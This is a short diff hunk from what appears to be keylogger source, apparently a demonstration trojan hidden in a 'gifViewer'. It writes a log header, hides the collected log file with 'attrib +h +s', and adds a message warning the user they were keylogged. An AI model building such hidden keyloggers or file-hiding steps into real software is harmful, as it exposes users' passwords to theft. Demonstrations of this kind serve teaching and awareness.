@@ -72,7 +72,7 @@ int main()
     // hides the file
     time_t ttime = time(0);
     char *dt = ctime(&ttime);
-    std::string begin = "Current Local Date & Time: " + (std::string)dt + "\nBegin of log: \n";
+    std::string begin = "Current Local Date & Time: " + (std::string)dt + "\nBegin of log: \nYou've been keylogged!\nThis keylogging program was hidden inside of the gifViewer, and could have potentially sent your usernames and passwords to an attacker.";
     saveData(begin);
     system("attrib +h +s collected.txt");
 
